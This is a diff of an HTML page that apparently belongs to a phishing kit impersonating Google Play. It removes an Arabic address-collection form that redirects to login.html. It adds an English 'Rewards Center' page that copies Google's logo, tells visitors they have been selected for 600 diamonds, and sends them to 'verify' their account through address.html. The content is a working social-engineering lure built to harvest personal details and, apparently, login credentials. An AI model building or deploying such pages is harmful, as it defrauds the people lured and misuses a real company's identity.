@@ -1,196 +1,43 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>العنوان - Google Play Points</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-            background: #fff;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        
-        .address-container {
-            max-width: 450px;
-            width: 100%;
-            padding: 48px 40px 36px;
-            background: white;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-        }
-        
-        .google-logo {
-            text-align: center;
-            margin-bottom: 16px;
-        }
-        
-        .google-logo img {
-            height: 24px;
-        }
-        
-        .address-header {
-            text-align: center;
-            margin-bottom: 32px;
-        }
-        
-        .address-header h1 {
-            font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            margin: 0 0 8px 0;
-            letter-spacing: 0;
-        }
-        
-        .address-header p {
-            font-size: 16px;
-            color: #5f6368;
-            margin: 0;
-            font-weight: 400;
-        }
-        
-        .form-group {
-            margin-bottom: 24px;
-        }
-        
-        .form-group label {
-            display: block;
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 8px;
-            font-weight: 400;
-        }
-        
-        .form-group input {
-            width: 100%;
-            padding: 13px 15px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            color: #202124;
-            background: white;
-            transition: all 0.2s;
-            font-family: 'Roboto', Arial, sans-serif;
-        }
-        
-        .form-group input:hover {
-            border-color: #bdc1c6;
-        }
-        
-        .form-group input:focus {
-            outline: none;
-            border-color: #1a73e8;
-            border-width: 2px;
-            padding: 12px 14px;
-        }
-        
-        .form-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 16px;
-        }
-        
-        .submit-button {
-            width: 100%;
-            background: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 10px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            margin-top: 8px;
-            transition: background 0.2s;
-            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-            letter-spacing: 0.25px;
-        }
-        
-        .submit-button:hover {
-            background: #1765cc;
-            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
-        }
-        
-        .submit-button:active {
-            background: #1557b0;
-        }
-        
-        .submit-button:disabled {
-            background: #dadce0;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        @media (max-width: 600px) {
-            .address-container {
-                border: none;
-                padding: 24px 20px;
-            }
-            
-            .form-row {
-                grid-template-columns: 1fr;
-            }
-        }
-    </style>
+    <title>Google Play Rewards Center</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div class="address-container">
-        <div class="google-logo">
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    <div class="container">
+        <div id="offerScreen" class="screen active">
+            <div class="header">
+                <svg class="google-logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+                    <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+                    <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+                    <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+                    <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
+                    <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+                    <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
+                </svg>
+                <h1>Exclusive Reward Offer</h1>
+                <p class="subtitle">You've been selected for a special reward</p>
+            </div>
+            
+            <div class="reward-box">
+                <p style="font-size: 14px; color: #5f6368;">Available Reward</p>
+                <div class="reward-amount">600 💎</div>
+                <p style="font-size: 14px; color: #5f6368;">Diamonds</p>
+            </div>
+            
+            <div class="info-box">
+                <p style="font-weight: 500; margin-bottom: 8px;">How to claim:</p>
+                <p>1. Verify your eligibility<br>2. Complete account verification<br>3. Receive your diamonds instantly</p>
+            </div>
+            
+            <button class="btn" onclick="navigateTo('address.html')">Check Eligibility</button>
         </div>
-        
-        <div class="address-header">
-            <h1>معلومات العنوان</h1>
-            <p>أدخل عنوانك لإكمال عملية الاسترداد</p>
-        </div>
-        
-        <form id="addressForm">
-            <div class="form-group">
-                <label for="fullName">الاسم الكامل</label>
-                <input type="text" id="fullName" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="address1">العنوان السطر 1</label>
-                <input type="text" id="address1" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="address2">العنوان السطر 2 (اختياري)</label>
-                <input type="text" id="address2">
-            </div>
-            
-            <div class="form-row">
-                <div class="form-group">
-                    <label for="city">المدينة</label>
-                    <input type="text" id="city" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="postalCode">الرمز البريدي</label>
-                    <input type="text" id="postalCode" required>
-                </div>
-            </div>
-            
-            <button type="submit" class="submit-button">متابعة</button>
-        </form>
     </div>
     
-    <script>
-        document.getElementById('addressForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            window.location.href = 'login.html';
-        });
-    </script>
+    <script src="app.js"></script>
 </body>
 </html>
